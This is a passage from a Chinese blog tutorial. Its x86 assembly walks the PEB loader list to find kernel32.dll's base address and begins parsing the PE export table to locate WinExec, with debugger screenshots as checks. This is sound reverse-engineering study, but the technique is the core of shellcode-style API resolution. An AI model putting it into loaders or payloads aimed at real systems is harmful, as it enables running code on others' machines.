&lt;p>接着从 WinDbg 可以实际发现，这个链表里，我们的程序之后就是&lt;code>ntdll.dll&lt;/code>，再之后就是&lt;code>kernel32.dll&lt;/code>，不再演示。反正就当&lt;code>kernel32.dll&lt;/code>固定在这个链表的第三个元素就是了。真要高鲁棒性的话就得遍历这个链表，按名字找出 &lt;code>kernel32.dll&lt;/code> 对应的结构，再取地址——麻烦死了。&lt;/p>
&lt;p>取得 &lt;code>kernel32.dll&lt;/code> 对应的 &lt;code>_LDR_DATA_TABLE_ENTRY&lt;/code> 结构后，就可以提取其中的 &lt;code>DllBase&lt;/code> 字段了，这个字段就是 &lt;code>kernel32.dll&lt;/code> 的基址。&lt;/p>
&lt;h3 id="15-teb-的位置">1.5 TEB 的位置&lt;/h3>
&lt;p>谷歌一下不难找到，Win32程序进程地址空间里，TEB的地址就在 &lt;code>[fs:0]&lt;/code> 这个地址上。&lt;/p>
&lt;h3 id="16-获取-kernel-32-基址">1.6 获取 kernel 32 基址&lt;/h3>
&lt;p>那就开始写汇编。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="nf">section&lt;/span> &lt;span class="no">.text&lt;/span>
&lt;span class="nf">global&lt;/span> &lt;span class="no">_main&lt;/span>
&lt;span class="nl">_main:&lt;/span>
&lt;span class="nf">push&lt;/span> &lt;span class="no">ebp&lt;/span>
&lt;span class="nf">mov&lt;/span> &lt;span class="no">ebp&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="no">esp&lt;/span>
&lt;span class="c">; 获取 kernel32.dll 基址
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="nf">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">fs&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">30&lt;/span>&lt;span class="no">h&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c">; eax = TEB-&amp;gt;PEB
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">eax&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="no">ch&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c">; eax = PEB-&amp;gt;Ldr
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">eax&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="mi">14&lt;/span>&lt;span class="no">h&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c">; eax = PEB_LDR_DATA-&amp;gt;InMemoryOrderModuleList.Flink (当前程序)
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">eax&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c">; eax = &amp;amp;_LDR_DATA_TABLE_ENTRY.InMemoryOrderModuleList.Flink (现在是 ntdll.dll)
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">eax&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c">; eax = &amp;amp;_LDR_DATA_TABLE_ENTRY.InMemoryOrderModuleList.Flink (现在是 kernel32.dll)
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">eax-8h&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="mi">18&lt;/span>&lt;span class="no">h&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c">; eax = &amp;amp;_LDR_DATA_TABLE_ENTRY.DllBase (kernel32.dll 基址)
&lt;/span>&lt;span class="c">&lt;/span>
&lt;span class="nf">xor&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="no">eax&lt;/span>
&lt;span class="nf">pop&lt;/span> &lt;span class="no">ebp&lt;/span>
&lt;span class="nf">retn&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>用 MinGW 编译。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">nasm main.asm -f win32 -o main.o
gcc main.o -nostartfiles -nodefaultlibs -o main.exe
&lt;/code>&lt;/pre>&lt;/div>&lt;p>第一步 &lt;code>[fs:30h]&lt;/code> 这个地址就是 TEB 中的 PEB 指针，将指针保存的地址移入 &lt;code>eax&lt;/code> 寄存器。现在 &lt;code>eax&lt;/code> 寄存器指向的就是 PEB 结构了。&lt;/p>
&lt;p>第二步取 &lt;code>PEB-&amp;gt;Ldr&lt;/code> 指针。&lt;/p>
&lt;p>第三步取 &lt;code>PEB_LDR_DATA-&amp;gt;InMemoryOrderModuleList.Flink&lt;/code> 指针，这个指针指向的是当前程序的 &lt;code>_LDR_DATA_TABLE_ENTRY.InMemoryOrderModuleList.Flink&lt;/code> 。此时我们已经开始遍历链表。&lt;/p>
&lt;p>第四步是取链表的下一个元素，我们认为是 &lt;code>ntdll.dll&lt;/code> ，再取下一个元素，得到 &lt;code>kernel32.dll&lt;/code>。&lt;/p>
&lt;p>此时的 &lt;code>eax&lt;/code> 指向的还是 &lt;code>_LDR_DATA_TABLE_ENTRY.InMemoryOrderModuleList.Flink&lt;/code> 请注意，计算偏移的时候要先移回结构的首部（&lt;code>-0x08&lt;/code>）再计算。&lt;/p>
&lt;p>第五步就是从 &lt;code>kernel32.dll&lt;/code> 的 &lt;code>_LDR_DATA_TABLE_ENTRY&lt;/code> 结构里，取 &lt;code>DllBase&lt;/code> 字段的值了。&lt;code>eax - 8h + 18h&lt;/code> 得到 &lt;code>DllBase&lt;/code> 字段的偏移地址，执行后得到的就是 &lt;code>kernel32.dll&lt;/code> 的基址指针了。&lt;/p>
&lt;p>我们可以用 WinDbg Preview 验证下。&lt;/p>
&lt;p>&amp;hellip;.&lt;/p>
&lt;p>不知道为啥 WinDbg Preview 不能正确调试，还是用回 x32dbg 。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/%e5%85%b3%e4%ba%8e%e5%9c%a8%e5%86%85%e5%ad%98%e9%87%8c%e6%89%bekernel32%e8%bf%99%e4%bb%b6%e4%ba%8b/image-20211014143628806.png"
loading="lazy"
alt="image-20211014143628806"
>&lt;/p>
&lt;p>注意此时 EAX 的值是 &lt;code>75B30000&lt;/code> ，内容被调试器识别为 &lt;code>MZ?&lt;/code> ，显然是个 DOS 文件头。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/%e5%85%b3%e4%ba%8e%e5%9c%a8%e5%86%85%e5%ad%98%e9%87%8c%e6%89%bekernel32%e8%bf%99%e4%bb%b6%e4%ba%8b/image-20211014143759203.png"
loading="lazy"
alt="image-20211014143759203"
>&lt;/p>
&lt;p>在调试器的内存布局窗口可以看到，这个地址正好就是 &lt;code>kernel32.dll&lt;/code> 的镜像基址。&lt;/p>
&lt;p>到此，我们已经找到了 &lt;code>kernel32.dll&lt;/code> 的镜像基址，找到了镜像基址后，根据之前学习的对 PE 文件格式的了解，就有机会自己解析导出表，调用 &lt;code>kernel32.dll&lt;/code> 内的函数啦。&lt;/p>
&lt;h2 id="0x02-寻找-winexec-函数">0x02 寻找 WinExec 函数&lt;/h2>
&lt;p>作为实践的目标，这次希望在 &lt;code>kernel32.dll&lt;/code> 里找出 &lt;code>WinExec&lt;/code> 函数。这个函数的文档在&lt;a class="link" href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec" target="_blank" rel="noopener"
>这里&lt;/a>。函数签名如下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c++" data-lang="c++">&lt;span class="n">UINT&lt;/span> &lt;span class="nf">WinExec&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="p">[&lt;/span>&lt;span class="n">in&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="n">LPCSTR&lt;/span> &lt;span class="n">lpCmdLine&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="p">[&lt;/span>&lt;span class="n">in&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="n">UINT&lt;/span> &lt;span class="n">uCmdShow&lt;/span>
&lt;span class="p">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>文档说我们应该用 &lt;code>CreateProcess&lt;/code> 但是那个函数参数多的一批，狗都不看。微软就没点13数么。&lt;/p>
&lt;h3 id="21-寻找导出表">2.1 寻找导出表&lt;/h3>
&lt;p>有了 &lt;code>kernel32.dll&lt;/code> 的基址，下一步就是寻找导出表的位置了。&lt;/p>
&lt;p>依据我们对 PE 文件格式的了解，首先得在 Data Directories 里找到 &lt;em>Export Directory&lt;/em> 。&lt;/p>
&lt;p>在此之前，我们先暂存一下 &lt;code>kernel32.dll&lt;/code> 基址以备后用。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm"> &lt;span class="nf">mov&lt;/span> &lt;span class="no">ebx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">eax&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后开始寻找 dos 文件头里的 &lt;code>lfanew&lt;/code> 。相对文件头的偏移是 &lt;code>3ch&lt;/code> ，内容是相对文件头的偏移值，我们这样计算。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm"> &lt;span class="nf">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">ebx&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="no">ch&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="nf">add&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">ebx&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>现在 eax 指向的就是 pe 文件头了。&lt;/p>
&lt;p>然后我们找到 &lt;code>ExportDirectory.VirtualAddress&lt;/code> 的偏移，它在相对 PE 文件头 &lt;code>78h&lt;/code> 偏移的地方。如果还记得 16 个元素的 Data Directories 结构的话，提醒下 ExportDirectory 就是所有 Data Directories 里排第一个的结构。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm"> &lt;span class="nf">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">eax&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="mi">78&lt;/span>&lt;span class="no">h&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c">; eax = ExportDirectory.VirtualAddress
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>得到的是 RVA ，加上基址。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm"> &lt;span class="nf">add&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">ebx&lt;/span> &lt;span class="c">; eax = &amp;amp;ExportDirectoryTable
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>接下来要开始解析 ExportDirectoryTable 结构了，参考&lt;a class="link" href="https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#export-directory-table" target="_blank" rel="noopener"
>微软的文档&lt;/a>。&lt;/p>
&lt;p>因为需要暂存很多变量，我们先给这些变量在栈上分配空间。&lt;/p>
&lt;h3 id="22-分配栈变量">2.2 分配栈变量&lt;/h3>
&lt;p>先回到开头，定义好栈如何分配。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="err">%&lt;/span>&lt;span class="nf">define&lt;/span> &lt;span class="no">kernel32_base&lt;/span> &lt;span class="mi">0x04&lt;/span>
&lt;span class="err">%&lt;/span>&lt;span class="nf">define&lt;/span> &lt;span class="no">numberof_export_entries&lt;/span> &lt;span class="mi">0x08&lt;/span>
&lt;span class="err">%&lt;/span>&lt;span class="nf">define&lt;/span> &lt;span class="no">address_of_ordinal_table&lt;/span> &lt;span class="mi">0x0c&lt;/span>
&lt;span class="err">%&lt;/span>&lt;span class="nf">define&lt;/span> &lt;span class="no">address_of_func_address_table&lt;/span> &lt;span class="mi">0x10&lt;/span>
&lt;span class="err">%&lt;/span>&lt;span class="nf">define&lt;/span> &lt;span class="no">address_of_export_directory_table&lt;/span> &lt;span class="mi">0x14&lt;/span>
&lt;span class="err">%&lt;/span>&lt;span class="nf">define&lt;/span> &lt;span class="no">address_of_name_table&lt;/span> &lt;span class="mi">0x18&lt;/span>
&lt;span class="err">%&lt;/span>&lt;span class="nf">define&lt;/span> &lt;span class="no">ordinal_base&lt;/span> &lt;span class="mi">0x1c&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后在入口点处，添加 &lt;code>sub esp, 0x1c&lt;/code>，分配栈空间。之后就可以使用 &lt;code>[ebp-变量]&lt;/code> 的形式来使用这些变量了。修改后的代码如下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="err">%&lt;/span>&lt;span class="nf">define&lt;/span> &lt;span class="no">kernel32_base&lt;/span> &lt;span class="mi">0x04&lt;/span>
&lt;span class="err">%&lt;/span>&lt;span class="nf">define&lt;/span> &lt;span class="no">numberof_export_entries&lt;/span> &lt;span class="mi">0x08&lt;/span>
&lt;span class="err">%&lt;/span>&lt;span class="nf">define&lt;/span> &lt;span class="no">address_of_ordinal_table&lt;/span> &lt;span class="mi">0x0c&lt;/span>
&lt;span class="err">%&lt;/span>&lt;span class="nf">define&lt;/span> &lt;span class="no">address_of_func_address_table&lt;/span> &lt;span class="mi">0x10&lt;/span>
&lt;span class="err">%&lt;/span>&lt;span class="nf">define&lt;/span> &lt;span class="no">address_of_export_directory_table&lt;/span> &lt;span class="mi">0x14&lt;/span>
&lt;span class="err">%&lt;/span>&lt;span class="nf">define&lt;/span> &lt;span class="no">address_of_name_table&lt;/span> &lt;span class="mi">0x18&lt;/span>
&lt;span class="err">%&lt;/span>&lt;span class="nf">define&lt;/span> &lt;span class="no">ordinal_base&lt;/span> &lt;span class="mi">0x1c&lt;/span>
&lt;span class="nf">section&lt;/span> &lt;span class="no">.text&lt;/span>
&lt;span class="nf">global&lt;/span> &lt;span class="no">_main&lt;/span>
&lt;span class="nl">_main:&lt;/span>
&lt;span class="nf">push&lt;/span> &lt;span class="no">ebp&lt;/span>
&lt;span class="nf">mov&lt;/span> &lt;span class="no">ebp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">esp&lt;/span>
&lt;span class="nf">sub&lt;/span> &lt;span class="no">esp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="no">ch&lt;/span>
&lt;span class="c">; 获取 kernel32.dll 基址
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="nf">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">fs&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">30&lt;/span>&lt;span class="no">h&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c">; eax = TEB-&amp;gt;PEB
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">eax&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="no">ch&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c">; eax = PEB-&amp;gt;Ldr
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">eax&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="mi">14&lt;/span>&lt;span class="no">h&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c">; eax = PEB_LDR_DATA-&amp;gt;InMemoryOrderModuleList.Flink (当前程序)
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">eax&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c">; eax = &amp;amp;_LDR_DATA_TABLE_ENTRY.InMemoryOrderModuleList.Flink (现在是 ntdll.dll)
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">eax&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c">; eax = &amp;amp;_LDR_DATA_TABLE_ENTRY.InMemoryOrderModuleList.Flink (现在是 kernel32.dll)
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">eax-8h&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="mi">18&lt;/span>&lt;span class="no">h&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c">; eax = &amp;amp;_LDR_DATA_TABLE_ENTRY.DllBase (kernel32.dll 基址)
&lt;/span>&lt;span class="c">&lt;/span>
&lt;span class="nf">mov&lt;/span> &lt;span class="no">ebx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">eax&lt;/span> &lt;span class="c">; ebx -&amp;gt; kernel32.dll 基址
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">ebp-kernel32_base&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="no">eax&lt;/span> &lt;span class="c">; kernel32_base -&amp;gt; kernel32.dll 基址
&lt;/span>&lt;span class="c">&lt;/span>
&lt;span class="nf">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">ebx&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="no">ch&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="nf">add&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">ebx&lt;/span> &lt;span class="c">; eax -&amp;gt; kernel32.dll 的 pe 文件头
&lt;/span>&lt;span class="c">&lt;/span>
&lt;span class="nf">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">eax&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="mi">78&lt;/span>&lt;span class="no">h&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c">; eax -&amp;gt; ExportDirectory.VirtualAddress
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">add&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">ebx&lt;/span> &lt;span class="c">; eax -&amp;gt; Export Directory Table
&lt;/span>&lt;span class="c">&lt;/span>
&lt;span class="nf">xor&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">eax&lt;/span>
&lt;span class="nf">add&lt;/span> &lt;span class="no">esp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="no">ch&lt;/span>
&lt;span class="nf">pop&lt;/span> &lt;span class="no">ebp&lt;/span>
&lt;span class="nf">retn&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>接着从 &lt;code>xor eax,eax&lt;/code> 之前继续。&lt;/p>
&lt;h3 id="23-分析-export-directory-table">2.3 分析 Export Directory Table&lt;/h3>
&lt;p>先给出定义。&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:left">Offset&lt;/th>
&lt;th style="text-align:left">Size&lt;/th>
&lt;th style="text-align:left">Field&lt;/th>
&lt;th style="text-align:left">Description&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:left">0&lt;/td>
&lt;td style="text-align:left">4&lt;/td>
&lt;td style="text-align:left">Export Flags&lt;/td>
&lt;td style="text-align:left">Reserved, must be 0.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">4&lt;/td>
&lt;td style="text-align:left">4&lt;/td>
&lt;td style="text-align:left">Time/Date Stamp&lt;/td>
&lt;td style="text-align:left">The time and date that the export data was created.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">8&lt;/td>
&lt;td style="text-align:left">2&lt;/td>
&lt;td style="text-align:left">Major Version&lt;/td>
&lt;td style="text-align:left">The major version number. The major and minor version numbers can be set by the user.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">10&lt;/td>
&lt;td style="text-align:left">2&lt;/td>
&lt;td style="text-align:left">Minor Version&lt;/td>
&lt;td style="text-align:left">The minor version number.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">12&lt;/td>
&lt;td style="text-align:left">4&lt;/td>
&lt;td style="text-align:left">Name RVA&lt;/td>
&lt;td style="text-align:left">The address of the ASCII string that contains the name of the DLL. This address is relative to the image base.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">16&lt;/td>
&lt;td style="text-align:left">4&lt;/td>
&lt;td style="text-align:left">Ordinal Base&lt;/td>
&lt;td style="text-align:left">The starting ordinal number for exports in this image. This field specifies the starting ordinal number for the export address table. It is usually set to 1.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">20&lt;/td>
&lt;td style="text-align:left">4&lt;/td>
&lt;td style="text-align:left">Address Table Entries&lt;/td>
&lt;td style="text-align:left">The number of entries in the export address table.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">24&lt;/td>
&lt;td style="text-align:left">4&lt;/td>
&lt;td style="text-align:left">Number of Name Pointers&lt;/td>
&lt;td style="text-align:left">The number of entries in the name pointer table. This is also the number of entries in the ordinal table.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">28&lt;/td>
&lt;td style="text-align:left">4&lt;/td>
&lt;td style="text-align:left">Export Address Table RVA&lt;/td>
&lt;td style="text-align:left">The address of the export address table, relative to the image base.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">32&lt;/td>
&lt;td style="text-align:left">4&lt;/td>
&lt;td style="text-align:left">Name Pointer RVA&lt;/td>
&lt;td style="text-align:left">The address of the export name pointer table, relative to the image base. The table size is given by the Number of Name Pointers field.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">36&lt;/td>
&lt;td style="text-align:left">4&lt;/td>
&lt;td style="text-align:left">Ordinal Table RVA&lt;/td>
&lt;td style="text-align:left">The address of the ordinal table, relative to the image base.&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>注意 offset 是 10 进制，之后编写的代码里会用 16 进制。&lt;/p>
&lt;p>我们把这个结构里，我们关注的字段保存到栈上。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm"> &lt;span class="nf">mov&lt;/span> &lt;span class="no">ecx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">eax&lt;/span> &lt;span class="c">; 暂存导出表结构基址用来运算
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">ebp-address_of_export_directory_table&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="no">eax&lt;/span> &lt;span class="c">; 保存导出表结构基址到栈变量
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">eax&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="no">ch&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="nf">add&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">ebx&lt;/span>
&lt;span class="nf">mov&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">ebp-address_of_func_address_table&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="no">eax&lt;/span> &lt;span class="c">; 保存导出函数表地址到栈变量
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">ecx&lt;/span>
&lt;span class="nf">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">eax&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="mi">24&lt;/span>&lt;span class="no">h&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="nf">add&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">ebx&lt;/span>
&lt;span class="nf">mov&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">ebp-address_of_ordinal_table&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="no">eax&lt;/span> &lt;span class="c">; 保存ordinal表地址到栈变量
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">ecx&lt;/span>
&lt;span class="nf">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">eax&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="mi">18&lt;/span>&lt;span class="no">h&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="nf">mov&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">ebp-numberof_export_entries&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="no">eax&lt;/span> &lt;span class="c">; 保存导出表(name)数量到栈变量
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">ecx&lt;/span>
&lt;span class="nf">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">eax&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="mi">20&lt;/span>&lt;span class="no">h&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c">; eax=第一个函数名称的 RVA
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">ebp-address_of_name_table&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="no">eax&lt;/span> &lt;span class="c">; 保存导出函数的名称表到栈变量
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">ecx&lt;/span>
&lt;span class="nf">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">eax&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="no">h&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="nf">mov&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">ebp-ordinal_base&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="no">eax&lt;/span> &lt;span class="c">; 保存 ordinal base 用于计算导出函数的地址
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>应该不难理解。&lt;/p>
&lt;p>接下来要从这个结构里找出 &lt;code>WinExec&lt;/code> 函数的地址。&lt;/p>
&lt;h3 id="24-导出表和函数地址">2.4 导出表和函数地址&lt;/h3>
&lt;p>一些前置知识。&lt;/p>
&lt;p>导出函数的地址表是用 Ordinal 做索引的，所以必须先取得 Ordinal 才能正确取得地址。&lt;/p>
&lt;blockquote>
&lt;p>The export address table contains the address of exported entry points and exported data and absolutes. An ordinal number is used as an index into the export address table.&lt;/p>
&lt;/blockquote>
&lt;p>注意从 Ordinal Base 取出的值是 &lt;strong>unbiased indexes&lt;/strong>，从 Ordinal Table 里取出的 Ordinal 值并不需要减去 Ordinal Base 。但是 DUMPBIN 之类的工具似乎会给出加上了 Ordinal Base 的 Ordinal 值，也就是微软文档中说的 Biased Ordinal 。&lt;/p>
